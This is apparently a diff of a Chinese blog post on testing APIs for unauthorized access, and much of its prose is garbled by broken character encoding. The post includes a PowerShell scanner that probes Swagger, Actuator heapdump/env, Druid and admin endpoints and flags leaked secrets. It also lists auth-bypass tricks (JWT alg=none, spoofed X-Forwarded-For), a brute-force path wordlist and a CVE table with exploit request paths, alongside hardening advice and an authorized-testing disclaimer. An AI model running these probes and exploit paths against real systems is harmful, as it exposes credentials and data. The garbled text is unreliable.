鏂囦欢锛屾悳绱?api/ 鍏抽敭瀛?   - 鏌ョ湅 Swagger / Actuator / Druid 鏂囨。</span><br><span class="line">   - 浣跨敤鐩綍鎵弿宸ュ叿鐖嗙牬 API 璺緞</span><br><span class="line">   - 鍒嗘瀽 App 鍙嶇紪璇戝悗鐨?API 鎺ュ彛</span><br><span class="line"></span><br><span class="line">2. 鍒嗘瀽鎺ュ彛閴存潈鏂瑰紡</span><br><span class="line">   - Cookie/Session 閴存潈</span><br><span class="line">   - JWT/Bearer Token 閴存潈</span><br><span class="line">   - API Key/AppSecret 閴存潈</span><br><span class="line">   - IP 鐧藉悕鍗曢壌鏉?   - 鏃犻壌鏉冿紙鐩存帴鍙闂級</span><br><span class="line"></span><br><span class="line">3. 鏀堕泦璐﹀彿淇℃伅</span><br><span class="line">   - 娉ㄥ唽鏅€氱敤鎴疯处鍙?   - 鑾峰彇涓嶅悓瑙掕壊鐨?Token</span><br><span class="line">   - 閫氳繃鍏紑淇℃伅鑾峰彇绠＄悊鍛?鐗规潈璐﹀彿</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-2-鏈巿鏉冩娴嬮樁娈"><a href="#7-2-鏈巿鏉冩娴嬮樁娈" class="headerlink" title="7.2 鏈巿鏉冩娴嬮樁娈?"></a>7.2 鏈巿鏉冩娴嬮樁娈?</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">1. 鐩存帴璁块棶妫€娴?   - 涓嶅甫浠讳綍 Cookie/Token 璁块棶鏁忔劅鎺ュ彛</span><br><span class="line">   - 浣跨敤榛樿 Token 鎴栫┖ Token 璁块棶</span><br><span class="line"></span><br><span class="line">2. 鍙傛暟绡℃敼妫€娴?   - 淇敼 ID 鍙傛暟閬嶅巻</span><br><span class="line">   - 淇敼瑙掕壊鍙傛暟鎻愭潈</span><br><span class="line">   - 淇敼 public=true 缁曡繃閴存潈</span><br><span class="line"></span><br><span class="line">3. HTTP 鏂规硶绡℃敼</span><br><span class="line">   - GET 鏀逛负 POST</span><br><span class="line">   - POST 鏀逛负 PUT/DELETE</span><br><span class="line">   - 娣诲姞 X-HTTP-Method-Override 澶?</span><br><span class="line">4. 璇锋眰澶寸鏀?   - 娣诲姞 X-Forwarded-For: 127.0.0.1</span><br><span class="line">   - 娣诲姞 X-Real-IP: 127.0.0.1</span><br><span class="line">   - 娣诲姞 Origin/Referer 浠块€犲唴閮ㄨ姹?   - 娣诲姞 X-Requested-With: XMLHttpRequest</span><br><span class="line"></span><br><span class="line">5. 璁よ瘉缁曡繃</span><br><span class="line">   - 鍒犻櫎 Cookie/Token 瀛楁</span><br><span class="line">   - 浣跨敤鍏朵粬鐢ㄦ埛鐨?Token</span><br><span class="line">   - 浣跨敤杩囨湡 Token</span><br><span class="line">   - JWT alg=none 鏀诲嚮</span><br></pre></td></tr></table></figure>
+
+<h3 id="7-3-鍒╃敤闃舵"><a href="#7-3-鍒╃敤闃舵" class="headerlink" title="7.3 鍒╃敤闃舵"></a>7.3 鍒╃敤闃舵</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><span class="line">1. 淇℃伅娉勯湶绫?   鈫?鎴浘璇佹槑鍗冲彲锛屼笉涓嬭浇鍏ㄩ噺鏁版嵁</span><br><span class="line">   鈫?鏍囪鏁忔劅鏁版嵁锛堟暟鎹簱瀵嗙爜銆佸瘑閽ャ€乀oken锛?</span><br><span class="line">2. 瓒婃潈鎿嶄綔绫?   鈫?浠呴獙璇佸彲鎿嶄綔锛屼笉瀹為檯绡℃敼/鍒犻櫎</span><br><span class="line">   鈫?鎴浘璇佹槑鎿嶄綔鍓嶅悗瀵规瘮</span><br><span class="line"></span><br><span class="line">3. Getshell 绫?   鈫?涓婁紶娴嬭瘯鏂囦欢锛堝 info.jsp/txt锛?   鈫?璇佹槑鍙墽琛屽嵆鍙紝涓嶄笂浼犳湪椹?</span><br><span class="line">4. 鏉冮檺鎻愬崌绫?   鈫?楠岃瘉鍙垱寤虹鐞嗗憳璐︽埛</span><br><span class="line">   鈫?鍒涘缓鍚庡垹闄わ紝鎴栨埅鍥捐瘉鏄庡彲琛屾€?```</span><br><span class="line"></span><br><span class="line">---</span><br><span class="line"></span><br><span class="line">## 鍏€侀€氱敤妫€娴嬭剼鏈?</span><br><span class="line">### 8.1 API 鏈巿鏉冩壒閲忔娴嬶紙PowerShell锛?</span><br><span class="line">```powershell</span><br><span class="line"># APIScanner.ps1 - API 鏈巿鏉冩壒閲忔娴嬭剼鏈?param(</span><br><span class="line">  [string]$Target = &quot;http://target.com&quot;,</span><br><span class="line">  [string]$File = &quot;&quot;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">$results = @()</span><br><span class="line"></span><br><span class="line"># 閫氱敤妫€娴嬭矾寰?$commonChecks = @(</span><br><span class="line">  # Swagger</span><br><span class="line">  @&#123;Path=&quot;/swagger-ui.html&quot;; Desc=&quot;Swagger UI&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/v2/api-docs&quot;; Desc=&quot;Swagger API Docs v2&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/v3/api-docs&quot;; Desc=&quot;Swagger API Docs v3&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/swagger-resources&quot;; Desc=&quot;Swagger Resources&quot;&#125;,</span><br><span class="line">  # Actuator</span><br><span class="line">  @&#123;Path=&quot;/actuator&quot;; Desc=&quot;Actuator&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/actuator/env&quot;; Desc=&quot;Actuator Env&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/actuator/heapdump&quot;; Desc=&quot;Actuator Heapdump&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/actuator/mappings&quot;; Desc=&quot;Actuator Mappings&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/actuator/configprops&quot;; Desc=&quot;Actuator Configprops&quot;&#125;,</span><br><span class="line">  # Druid</span><br><span class="line">  @&#123;Path=&quot;/druid/index.html&quot;; Desc=&quot;Druid Monitor&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/druid/websession.json&quot;; Desc=&quot;Druid Session&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/druid/sql.json&quot;; Desc=&quot;Druid SQL&quot;&#125;,</span><br><span class="line">  # GraphQL</span><br><span class="line">  @&#123;Path=&quot;/graphql&quot;; Desc=&quot;GraphQL&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/graphiql&quot;; Desc=&quot;GraphiQL&quot;&#125;,</span><br><span class="line">  # 閫氱敤 API</span><br><span class="line">  @&#123;Path=&quot;/api/user/list&quot;; Desc=&quot;API User List&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/api/user/info&quot;; Desc=&quot;API User Info&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/api/config&quot;; Desc=&quot;API Config&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/api/database&quot;; Desc=&quot;API Database&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/api/upload&quot;; Method=&quot;POST&quot;; Desc=&quot;API Upload&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/api/admin&quot;; Desc=&quot;API Admin&quot;&#125;,</span><br><span class="line">  # CMS 鐩稿叧</span><br><span class="line">  @&#123;Path=&quot;/wp-json/wp/v2/users&quot;; Desc=&quot;WP API Users&quot;&#125;,</span><br><span class="line">  @&#123;Path=&quot;/api/index.php/v1/config/application?public=true&quot;; Desc=&quot;Joomla API&quot;&#125;</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"># 濡傛灉鎸囧畾浜嗘枃浠讹紝浠庢枃浠惰鍙栬矾寰?$checks = $commonChecks</span><br><span class="line">if ($File -and (Test-Path $File)) &#123;</span><br><span class="line">  $customPaths = Get-Content $File | Where-Object &#123; $_ -match &#x27;/api/&#x27; &#125;</span><br><span class="line">  foreach ($p in $customPaths) &#123;</span><br><span class="line">    $checks += @&#123;Path=$p.Trim(); Desc=&quot;Custom API&quot;&#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">Write-Host &quot;=== API 鏈巿鏉冩娴嬪紑濮? $Target ===&quot; -ForegroundColor Cyan</span><br><span class="line">Write-Host &quot;妫€娴嬭矾寰勬暟: $($checks.Count)`n&quot; -ForegroundColor Yellow</span><br><span class="line"></span><br><span class="line">foreach ($check in $checks) &#123;</span><br><span class="line">  $url = $Target.TrimEnd(&#x27;/&#x27;) + $check.Path</span><br><span class="line">  $method = if ($check.Method) &#123; $check.Method &#125; else &#123; &quot;GET&quot; &#125;</span><br><span class="line">  $start = Get-Date</span><br><span class="line"></span><br><span class="line">  try &#123;</span><br><span class="line">    $resp = Invoke-WebRequest -Uri $url -Method $method -TimeoutSec 8 -UseBasicParsing -ErrorAction Stop</span><br><span class="line">    $elapsed = (Get-Date) - $start</span><br><span class="line">    $size = $resp.RawContentLength</span><br><span class="line"></span><br><span class="line">    $result = @&#123;</span><br><span class="line">      Time = $start.ToString(&quot;HH:mm:ss&quot;)</span><br><span class="line">      Method = $method</span><br><span class="line">      Path = $check.Path</span><br><span class="line">      Desc = $check.Desc</span><br><span class="line">      Status = $resp.StatusCode</span><br><span class="line">      Size = $size</span><br><span class="line">      TimeMs = $elapsed.TotalMilliseconds.ToString(&quot;F0&quot;)</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if ($resp.StatusCode -eq 200) &#123;</span><br><span class="line">      # 杩涗竴姝ユ鏌ュ搷搴斿唴瀹规槸鍚﹀寘鍚晱鎰熸暟鎹?      $sensitive = @(&quot;password&quot;, &quot;secret&quot;, &quot;token&quot;, &quot;jdbc&quot;, &quot;redis&quot;, &quot;admin&quot;, &quot;com.zving&quot;, &quot;vsb&quot;)</span><br><span class="line">      $found = $false</span><br><span class="line">      foreach ($s in $sensitive) &#123;</span><br><span class="line">        if ($resp.Content -match $s) &#123; $found = $true; break &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      if ($found) &#123;</span><br><span class="line">        Write-Host &quot;[SENSITIVE] $($check.Desc) =&gt; $url (200, $($size)bytes)&quot; -ForegroundColor Red</span><br><span class="line">        $result.Level = &quot;SENSITIVE&quot;</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">        Write-Host &quot;[FOUND] $($check.Desc) =&gt; $url (200, $($size)bytes)&quot; -ForegroundColor Green</span><br><span class="line">        $result.Level = &quot;FOUND&quot;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; elseif ($resp.StatusCode -eq 401 -or $resp.StatusCode -eq 403) &#123;</span><br><span class="line">      Write-Host &quot;[AUTH] $($check.Desc) =&gt; $url ($($resp.StatusCode))&quot; -ForegroundColor Gray</span><br><span class="line">      $result.Level = &quot;AUTH&quot;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">      Write-Host &quot;[SKIP] $($check.Desc) =&gt; $url ($($resp.StatusCode))&quot; -ForegroundColor DarkGray</span><br><span class="line">      $result.Level = &quot;NONE&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    $results += $result</span><br><span class="line"></span><br><span class="line">  &#125; catch &#123;</span><br><span class="line">    Write-Host &quot;[ERR] $($check.Desc) =&gt; $url ($($_.Exception.Message))&quot; -ForegroundColor DarkGray</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"># 杈撳嚭鎶ュ憡</span><br><span class="line">Write-Host &quot;`n=== 妫€娴嬫姤鍛?===&quot; -ForegroundColor Cyan</span><br><span class="line">$found = $results | Where-Object &#123; $_.Level -eq &quot;FOUND&quot; -or $_.Level -eq &quot;SENSITIVE&quot; &#125;</span><br><span class="line">Write-Host &quot;鍙戠幇 $($found.Count) 涓湭鎺堟潈鎺ュ彛&quot; -ForegroundColor Green</span><br><span class="line">$found | Format-Table -Property Time, Method, Status, Path, Desc -AutoSize | Out-String | ForEach-Object &#123; Write-Host $_ &#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="8-2-閫氱敤-API-璺緞鐖嗙牬瀛楀吀"><a href="#8-2-閫氱敤-API-璺緞鐖嗙牬瀛楀吀" class="headerlink" title="8.2 閫氱敤 API 璺緞鐖嗙牬瀛楀吀"></a>8.2 閫氱敤 API 璺緞鐖嗙牬瀛楀吀</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 閫氱敤 API 璺緞瀛楀吀锛堜繚瀛樹负 api_paths.txt锛?/api</span></span><br><span class="line">/api/admin</span><br><span class="line">/api/user</span><br><span class="line">/api/users</span><br><span class="line">/api/config</span><br><span class="line">/api/database</span><br><span class="line">/api/db</span><br><span class="line">/api/redis</span><br><span class="line">/api/upload</span><br><span class="line">/api/download</span><br><span class="line">/api/file</span><br><span class="line">/api/files</span><br><span class="line">/api/order</span><br><span class="line">/api/orders</span><br><span class="line">/api/login</span><br><span class="line">/api/logout</span><br><span class="line">/api/register</span><br><span class="line">/api/export</span><br><span class="line">/api/import</span><br><span class="line">/api/backup</span><br><span class="line">/api/log</span><br><span class="line">/api/logs</span><br><span class="line">/api/info</span><br><span class="line">/api/status</span><br><span class="line">/api/health</span><br><span class="line">/api/metrics</span><br><span class="line">/api/swagger</span><br><span class="line">/api/doc</span><br><span class="line">/api/docs</span><br><span class="line">/api/graphql</span><br><span class="line">/api/v1</span><br><span class="line">/api/v2</span><br><span class="line">/api/v3</span><br><span class="line">/v1/api</span><br><span class="line">/v2/api</span><br><span class="line">/admin</span><br><span class="line">/admin/api</span><br><span class="line">/management</span><br><span class="line">/manage</span><br><span class="line">/monitor</span><br></pre></td></tr></table></figure>
+
+<hr>
+<h2 id="涔濄€侀槻寰″缓璁"><a href="#涔濄€侀槻寰″缓璁" class="headerlink" title="涔濄€侀槻寰″缓璁?"></a>涔濄€侀槻寰″缓璁?</h2><h3 id="9-1-寮€鍙戦樁娈"><a href="#9-1-寮€鍙戦樁娈" class="headerlink" title="9.1 寮€鍙戦樁娈?"></a>9.1 寮€鍙戦樁娈?</h3><table>
+<thead>
+<tr>
+<th align="left">鎺柦</th>
+<th align="left">璇存槑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>缁熶竴閴存潈妗嗘灦</strong></td>
+<td align="left">浣跨敤 Spring Security &#x2F; Shiro &#x2F; OAuth2 缁熶竴绠＄悊 API 閴存潈</td>
+</tr>
+<tr>
+<td align="left"><strong>榛樿鎷掔粷</strong></td>
+<td align="left">鎵€鏈?API 榛樿鎷掔粷璁块棶锛屼粎瀵圭櫧鍚嶅崟鎺ュ彛寮€鏀?</td>
+</tr>
+<tr>
+<td align="left"><strong>鎺ュ彛鍒嗙被</strong></td>
+<td align="left">鏄庣‘鍖哄垎鍏紑鎺ュ彛銆侀渶鐧诲綍鎺ュ彛銆侀渶绠＄悊鍛樻帴鍙?</td>
+</tr>
+<tr>
+<td align="left"><strong>寮哄埗璺敱</strong></td>
+<td align="left">鐢熶骇鐜寮€鍚己鍒惰矾鐢憋紝閬垮厤鎺у埗鍣ㄦ柟娉曠洿鎺ユ毚闇?</td>
+</tr>
+<tr>
+<td align="left"><strong>API 缃戝叧</strong></td>
+<td align="left">浣跨敤 API 缃戝叧缁熶竴绠℃帶璁よ瘉銆侀檺娴併€佸璁?</td>
+</tr>
+<tr>
+<td align="left"><strong>鍏抽棴 Swagger</strong></td>
+<td align="left">鐢熶骇鐜绂佺敤 Swagger 鏂囨。灞曠ず</td>
+</tr>
+<tr>
+<td align="left">*<em>鏈€灏忔潈闄?</em></td>
+<td align="left">API 鍙繑鍥炲繀瑕佸瓧娈碉紝涓嶆毚闇插瘑鐮?Session 绛夋晱鎰熶俊鎭?</td>
+</tr>
+</tbody></table>
+<h3 id="9-2-娴嬭瘯闃舵"><a href="#9-2-娴嬭瘯闃舵" class="headerlink" title="9.2 娴嬭瘯闃舵"></a>9.2 娴嬭瘯闃舵</h3><table>
+<thead>
+<tr>
+<th align="left">鎺柦</th>
+<th align="left">璇存槑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>瀹夊叏娴嬭瘯 Checklist</strong></td>
+<td align="left">灏?API 鏈巿鏉冩娴嬬撼鍏ュ彂甯冨墠瀹夊叏娴嬭瘯娴佺▼</td>
+</tr>
+<tr>
+<td align="left">*<em>鑷姩鍖栨壂鎻?</em></td>
+<td align="left">闆嗘垚 API 瀹夊叏鎵弿宸ュ叿鍒?CI&#x2F;CD 娴佹按绾?</td>
+</tr>
+<tr>
+<td align="left"><strong>鏉冮檺娴嬭瘯</strong></td>
+<td align="left">姣忎釜 API 娴嬭瘯涓夌鐘舵€侊細鏈櫥褰曘€佹櫘閫氱敤鎴枫€佺鐞嗗憳</td>
+</tr>
+</tbody></table>
+<h3 id="9-3-杩愮淮闃舵"><a href="#9-3-杩愮淮闃舵" class="headerlink" title="9.3 杩愮淮闃舵"></a>9.3 杩愮淮闃舵</h3><table>
+<thead>
+<tr>
+<th align="left">鎺柦</th>
+<th align="left">璇存槑</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left"><strong>WAF 瑙勫垯</strong></td>
+<td align="left">瀵?<code>/api/</code>銆乣&#x2F;actuator&#x2F;<code>銆乣/druid/</code> 璺緞閰嶇疆涓ユ牸 ACL</td>
+</tr>
+<tr>
+<td align="left"><strong>缃戠粶闅旂</strong></td>
+<td align="left">涓棿浠舵湇鍔★紙Redis銆丮ongoDB銆丏ocker锛変笉缁戝畾 0.0.0.0</td>
+</tr>
+<tr>
+<td align="left"><strong>璁块棶鎺у埗</strong></td>
+<td align="left">Actuator銆丏ruid 绛夌洃鎺х粍浠堕檺鍒跺唴缃戞垨鍔犵櫥褰曢獙璇?</td>
+</tr>
+<tr>
+<td align="left"><strong>鍙婃椂鏇存柊</strong></td>
+<td align="left">璺熻釜 CVE 婕忔礊鍏憡锛屽強鏃舵洿鏂颁腑闂翠欢鐗堟湰</td>
+</tr>
+<tr>
+<td align="left"><strong>鏃ュ織瀹¤</strong></td>
+<td align="left">璁板綍鎵€鏈?API 璁块棶鏃ュ織锛屽彂鐜板紓甯歌姹傚強鏃跺憡璀?</td>
+</tr>
+</tbody></table>
+<h3 id="9-4-涓棿浠跺畨鍏ㄩ厤缃"><a href="#9-4-涓棿浠跺畨鍏ㄩ厤缃" class="headerlink" title="9.4 涓棿浠跺畨鍏ㄩ厤缃?"></a>9.4 涓棿浠跺畨鍏ㄩ厤缃?</h3><table>
+<thead>
+<tr>
+<th align="left">涓棿浠?</th>
+<th align="left">瀹夊叏閰嶇疆鍛戒护</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">Redis</td>
+<td align="left"><code>bind 127.0.0.1</code> + <code>requirepass &lt;寮哄瘑鐮?</code> + <code>rename-command FLUSHALL &quot;&quot;</code></td>
+</tr>
+<tr>
+<td align="left">MongoDB</td>
+<td align="left">寮€鍚璇侊細<code>use admin; db.createUser(...)</code> + <code>security.authorization: enabled</code></td>
+</tr>
+<tr>
+<td align="left">Elasticsearch</td>
+<td align="left">寮€鍚?X-Pack 瀹夊叏璁よ瘉锛歚xpack.security.enabled: true&#96;</td>
+</tr>
+<tr>
+<td align="left">Docker</td>
+<td align="left">浣跨敤 TLS 璁よ瘉锛歚dockerd –tlsverify –tlscacert&#x3D;ca.pem&#96;</td>
+</tr>
+<tr>
+<td align="left">Jenkins</td>
+<td align="left">閰嶇疆瀹夊叏鍩燂細<code>Manage Jenkins 鈫?Configure Global Security 鈫?Jenkins own user database</code></td>
+</tr>
+<tr>
+<td align="left">Spring Boot</td>
+<td align="left"><code>management.endpoints.web.exposure.include=health,info</code> + <code>management.endpoint.health.show-details=never</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="鍗併€侀檮褰曪細CVE-閫熸煡琛"><a href="#鍗併€侀檮褰曪細CVE-閫熸煡琛" class="headerlink" title="鍗併€侀檮褰曪細CVE 閫熸煡琛?"></a>鍗併€侀檮褰曪細CVE 閫熸煡琛?</h2><table>
+<thead>
+<tr>
+<th align="left">CVE 缂栧彿</th>
+<th align="left">褰卞搷缁勪欢</th>
+<th align="left">婕忔礊绫诲瀷</th>
+<th align="left">褰卞搷鐗堟湰</th>
+<th align="left">鍒╃敤鏂规硶</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">CVE-2023-23752</td>
+<td align="left">Joomla! CMS</td>
+<td align="left">REST API 鏈巿鏉?</td>
+<td align="left">4.0.0 - 4.2.7</td>
+<td align="left"><code>GET /api/index.php/v1/config/application?public=true</code></td>
+</tr>
+<tr>
+<td align="left">CVE-2022-24637</td>
+<td align="left">Open Web Analytics</td>
+<td align="left">鏈巿鏉?RCE</td>
+<td align="left">鈮?1.7.4</td>
+<td align="left">鏈巿鏉冭闂?</td>
+</tr>
+<tr>
+<td align="left">CVE-2021-3129</td>
+<td align="left">Laravel Ignition</td>
+<td align="left">鏈巿鏉?RCE</td>
+<td align="left">鈮?8.4</td>
+<td align="left">杩滅▼浠ｇ爜鎵ц</td>
+</tr>
+<tr>
+<td align="left">CVE-2021-22986</td>
+<td align="left">F5 BIG-IP iControl REST</td>
+<td align="left">鏈巿鏉?RCE</td>
+<td align="left">16.0.0-16.1.0</td>
+<td align="left"><code>POST /mgmt/tm/util/bash</code></td>
+</tr>
+<tr>
+<td align="left">CVE-2020-14882</td>
+<td align="left">Oracle WebLogic</td>
+<td align="left">鏈巿鏉?RCE</td>
+<td align="left">10.3.6.0.0+</td>
+<td align="left"><code>GET /console/images/%2e%2e%2fconsole.portal</code></td>
+</tr>
+<tr>
+<td align="left">CVE-2020-8193</td>
+<td align="left">Citrix ADC</td>
+<td align="left">鏈巿鏉冭闂?</td>
+<td align="left">鍏ㄧ増鏈?</td>
+<td align="left">瓒婃潈</td>
+</tr>
+<tr>
+<td align="left">CVE-2020-5902</td>
+<td align="left">BIG-IP TMUI</td>
+<td align="left">鏈巿鏉?RCE</td>
+<td align="left">11.6.x-15.1.x</td>
+<td align="left"><code>GET /tmui/login.jsp/..;/tmui/locallb/workspace/</code></td>
+</tr>
+<tr>
+<td align="left">CVE-2019-11581</td>
+<td align="left">Jira Server</td>
+<td align="left">鏈巿鏉?SSRF</td>
+<td align="left">&lt; 7.6.14</td>
+<td align="left"><code>/plugins/servlet/oauth</code></td>
+</tr>
+<tr>
+<td align="left">CVE-2019-7238</td>
+<td align="left">Nexus Repository</td>
+<td align="left">鏈巿鏉?EL 娉ㄥ叆</td>
+<td align="left">2.x</td>
+<td align="left">琛ㄨ揪寮忔敞鍏?</td>
+</tr>
+<tr>
+<td align="left">CVE-2018-3760</td>
+<td align="left">Ruby on Rails</td>
+<td align="left">鏈巿鏉冩枃浠惰鍙?</td>
+<td align="left">&lt; 5.2.1</td>
+<td align="left">璺緞閬嶅巻</td>
+</tr>
+<tr>
+<td align="left">CNVD-2020-62422</td>
+<td align="left">鑷磋繙OA</td>
+<td align="left">鏈巿鏉?Getshell</td>
+<td align="left">A8 V5&#x2F;V6</td>
+<td align="left">AJAX 璋冪敤</td>
+</tr>
+<tr>
+<td align="left">CNVD-2021-49104</td>
+<td align="left">鐢ㄥ弸NC</td>
+<td align="left">鏈巿鏉?RCE</td>
+<td align="left">NC6.5</td>
+<td align="left"><code>/NCFindWeb</code></td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="闄勶細鍙傝€冮摼鎺"><a href="#闄勶細鍙傝€冮摼鎺" class="headerlink" title="闄勶細鍙傝€冮摼鎺?"></a>闄勶細鍙傝€冮摼鎺?</h2><ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_60838266/article/details/140504267">甯歌鏈巿鏉冭闂紡娲?- CSDN</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_53058639/article/details/136163842">Druid鏈巿鏉冩紡娲炶繘涓€姝ュ埄鐢?- CSDN</a></li>
+<li>[Swagger API 鏈巿鏉冭闂紡娲?- 鍗氬鍥璢(<a target="_blank" rel="noopener" href="https://www.cnblogs.com/wsx2019/p/archive/2023/06/01">https://www.cnblogs.com/wsx2019/p/archive/2023/06/01</a>)</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/wfzshi666/article/details/129158027">Joomla 鏈巿鏉冭闂?CVE-2023-23752</a></li>
+<li>[鏈巿鏉冭闂紡娲炴€荤粨 - 鍗氬鍥璢(<a target="_blank" rel="noopener" href="http://www.cnblogs.com/bonelee/p/12500044.html">http://www.cnblogs.com/bonelee/p/12500044.html</a>)</li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_77360081/article/details/131113909">API鎺ュ彛婕忔礊妗堜緥 - CSDN</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/2301_80127209/article/details/135387777">瀹炴垬SRC | API鎺ュ彛鏈巿鏉?+ 瓒婃潈婕忔礊</a></li>
+</ul>
+<hr>
+<blockquote>
+<p><strong>鍏嶈矗澹版槑</strong>锛氭湰鏂囨。浠呬緵瀹夊叏鐮旂┒鍜屾巿鏉冩祴璇曚娇鐢ㄣ€傛湭缁忔巿鏉冪殑 API 鏈巿鏉冭闂娴嬪彲鑳芥瀯鎴愯繚娉曡涓猴紝璇蜂弗鏍奸伒瀹堛€婄綉缁滃畨鍏ㄦ硶銆嬪強鐩稿叧娉曞緥娉曡銆傛墍鏈夋祴璇曡涓哄繀椤诲湪鑾峰緱鍚堟硶鎺堟潈鐨勫墠鎻愪笅杩涜銆</p>
+</blockquote>
+
+    </div>
+
+    
+    
+    
+
+      <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/API/" rel="tag"># API</a>
+              <a href="/tags/%E6%9C%AA%E6%8E%88%E6%9D%83/" rel="tag"># 未授权</a>
+              <a href="/tags/Web%E5%AE%89%E5%85%A8/" rel="tag"># Web安全</a>
